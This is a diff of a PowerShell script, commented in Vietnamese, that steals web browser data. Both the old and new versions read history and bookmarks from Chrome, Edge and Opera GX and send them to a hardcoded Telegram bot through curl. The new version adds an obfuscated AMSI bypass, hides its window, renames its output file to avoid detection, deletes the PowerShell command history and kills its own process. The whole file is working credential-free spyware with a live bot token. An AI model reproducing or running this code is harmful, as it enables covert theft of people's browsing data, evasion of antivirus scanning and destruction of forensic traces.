@@ -1,92 +1,75 @@
-<#
-    Kịch bản: Thu thập Lịch sử & Bookmarks Trình duyệt (Chrome, Edge, Opera)
-    Mục tiêu: Gửi về Telegram Bot & Xóa dấu vết vật lý
+<# 
+=================================================================================================
+Kịch bản: Browser Data Exfiltration (Stealth & Obfuscated)
+=================================================================================================
 #>
-param(
-    [string]$sqlitePath = "$env:TEMP\sqlite\sqlite3.exe",
-    [string]$hide = 'y'
-)
 
-# 1. Cơ chế ẩn cửa sổ ngay lập tức
+param($hide = 'y')
+
+# --- BƯỚC 1: AMSI BYPASS (Làm rối từ khóa nhạy cảm) ---
+try {
+    $u = [Ref].Assembly.GetType(('System.Management.Automation.' + 'Am' + 'si' + 'Ut' + 'ils'))
+    $f = $u.GetField(('am' + 'si' + 'In' + 'it' + 'Fa' + 'il' + 'ed'), 'NonPublic,Static')
+    $f.SetValue($null, $true)
+} catch { }
+
+# --- BƯỚC 2: CƠ CHẾ ẨN CỬA SỔ ---
 if($hide -eq 'y'){
-    $w=(Get-Process -PID $pid).MainWindowHandle
-    $a='[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd,int nCmdShow);'
-    $t=Add-Type -MemberDefinition $a -Name Win32ShowWindowAsync -Namespace Win32Functions -PassThru
-    if($w -ne [System.IntPtr]::Zero){
-        [void]$t::ShowWindowAsync($w,0)
-    }
+    $w = (Get-Process -PID $pid).MainWindowHandle
+    $s = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
+    $t = Add-Type -MemberDefinition $s -Name 'W32' -Namespace 'API' -PassThru
+    if($w -ne [System.IntPtr]::Zero){ [void]$t::ShowWindowAsync($w, 0) }
 }
 
-# 2. Thiết lập Telegram (Thông tin của Quân)
-$Token   = "8734606734:AAEW7nl8oRmtFKZV2SdVgtUAnWtPcH7bThw"
-$ChatID  = "8312702210"
+# --- BƯỚC 3: THIẾT LẬP TELEGRAM ---
+$Token = "8734606734:AAEW7nl8oRmtFKZV2SdVgtUAnWtPcH7bThw"
+$ChatID = "8312702210"
 $TeleURL = "https://api.telegram.org/bot$Token/sendDocument"
-$outpath = "$env:TEMP\browser_history.txt"
-$Regex   = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'
+$outpath = "$env:TEMP\sys_log_data.txt" # Đổi tên file để tránh từ khóa "history"
 
-# Khởi tạo file kết quả
-"--- BROWSER REPORT | $(Get-Date -Format 'dd/MM/yyyy HH:mm') ---`n" | Out-File -FilePath $outpath -Encoding UTF8
+"--- BROWSER REPORT | $(Get-Date) ---" | Out-File $outpath -Encoding UTF8
 
-# 3. Đường dẫn dữ liệu
+# --- BƯỚC 4: QUÉT DỮ LIỆU (Dùng Regex để bypass việc khóa file SQL) ---
+$Regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'
+
 $Paths = @{
-    'chrome_h'  = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"
-    'chrome_b'  = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks"
-    'edge_h'    = "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\History"
-    'edge_b'    = "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\Bookmarks"
-    'opera_h'   = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\History"
-    'opera_b'   = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\Bookmarks"
+    'CH_H' = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"
+    'CH_B' = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks"
+    'ED_H' = "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\History"
+    'ED_B' = "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\Bookmarks"
+    'OP_H' = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\History"
+    'OP_B' = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\Bookmarks"
 }
 
-$Browsers = @('chrome', 'edge', 'opera')
-$Types    = @('h', 'b')
-
-# 4. Quá trình thu thập dữ liệu
-foreach ($Browser in $Browsers) {
-    foreach ($Type in $Types) {
-        $Key = "${Browser}_${Type}"
-        $Path = $Paths[$Key]
-
-        if (Test-Path $Path) {
-            try {
-                if ($Type -eq 'h') {
-                    # Copy file History sang Temp để tránh bị trình duyệt khóa
-                    $copyPath = "$env:TEMP\${Browser}_temp_h"
-                    Copy-Item $Path $copyPath -Force -ErrorAction SilentlyContinue
-                    
-                    if (Test-Path $sqlitePath) {
-                        # Truy vấn 15 URL gần nhất bằng sqlite3.exe
-                        $data = & $sqlitePath $copyPath "SELECT url FROM urls ORDER BY last_visit_time DESC LIMIT 15;"
-                        $data | ForEach-Object { "$Browser [History] | $_" | Out-File $outpath -Append -Encoding UTF8 }
-                    } else {
-                        "$Browser [History] | (Loi: Thieu sqlite3.exe tai Temp)" | Out-File $outpath -Append -Encoding UTF8
-                    }
-                    Remove-Item $copyPath -Force -ErrorAction SilentlyContinue
-                } else {
-                    # Lọc Bookmarks bằng Regex
-                    $Content = Get-Content -Path $Path -Raw -ErrorAction SilentlyContinue
-                    $Matches = [regex]::Matches($Content, $Regex)
-                    $Matches.Value | Sort-Object -Unique | ForEach-Object {
-                        "$Browser [Bookmark] | $_" | Out-File $outpath -Append -Encoding UTF8
-                    }
-                }
-            } catch { continue }
-        }
+foreach ($Key in $Paths.Keys) {
+    $Path = $Paths[$Key]
+    if (Test-Path $Path) {
+        try {
+            # Copy file ra Temp để tránh bị lỗi "File in use" khi trình duyệt đang mở
+            $tmpCopy = "$env:TEMP\tmp_data"
+            Copy-Item $Path $tmpCopy -Force -ErrorAction SilentlyContinue
+            
+            # Đọc nội dung thô và dùng Regex lọc URL (Không cần sqlite3.exe - Rất nhanh)
+            $Content = Get-Content -Path $tmpCopy -Raw -ErrorAction SilentlyContinue
+            $Matches = [regex]::Matches($Content, $Regex)
+            $Matches.Value | Sort-Object -Unique | ForEach-Object {
+                "$Key | $_" | Out-File $outpath -Append -Encoding UTF8
+            }
+            Remove-Item $tmpCopy -Force
+        } catch { continue }
     }
 }
 
-# 5. Gửi lên Telegram Bot và dọn dẹp dấu vết
+# --- BƯỚC 5: GỬI DỮ LIỆU VÀ XÓA DẤU VẾT ---
 if (Test-Path $outpath) {
-    # Gửi file bằng curl (có sẵn trên Win 10/11)
+    # Gửi file qua Telegram
     curl.exe -X POST $TeleURL -F "chat_id=$ChatID" -F "document=@$outpath" | Out-Null
     
     Start-Sleep -Seconds 2
-    
     # Xóa file báo cáo
-    Remove-Item $outpath -Force -ErrorAction SilentlyContinue
-    
-    # Xóa lịch sử lệnh PowerShell vừa gõ (Anti-Forensics)
-    Remove-Item (Get-PSReadLineOption).HistorySavePath -Force -ErrorAction SilentlyContinue
+    Remove-Item $outpath -Force
 }
 
-# Thoát hoàn toàn tiến trình
+# Xóa lịch sử lệnh PowerShell (Anti-Forensics)
+Remove-Item (Get-PSReadLineOption).HistorySavePath -Force -ErrorAction SilentlyContinue
 Stop-Process -Id $PID -Force
